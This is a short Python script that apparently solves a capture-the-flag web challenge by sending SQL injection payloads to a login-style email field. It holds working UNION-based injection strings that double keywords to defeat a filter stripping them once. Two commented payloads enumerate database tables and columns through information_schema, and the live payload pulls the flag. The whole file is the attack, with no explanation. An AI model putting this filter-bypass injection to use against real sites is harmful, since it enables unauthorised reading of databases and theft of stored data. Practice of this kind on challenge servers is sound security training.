import requests
from bs4 import BeautifulSoup

url = "http://no-time.challs.olicyber.it/"

# payload = {"email": "fake@mail.com' UNIOUNIONN SELECSELECTT table_name FROFROMM information_schema.tables LIMILIMITT 1 OFFSEOFFSETT 1 -- -"}
# payload = {"email": "fake@mail.com' UNIOUNIONN SELECSELECTT column_name FROFROMM information_schema.columns WHEWHERERE table_name='qua_trovi_la_tua_flflagag' LIMILIMITT 1 OFFSEOFFSETT 0 -- -"}

payload = {"email": "fake@mail.com' UNIOUNIONN SELECSELECTT la_flflagag_sta_qua FROFROMM qua_trovi_la_tua_flflagag -- -"}

r = requests.post(url, data=payload)
soup = BeautifulSoup(r.text, "html.parser")

query_resp = soup.find_all("p")[-1].get_text()

print(query_resp)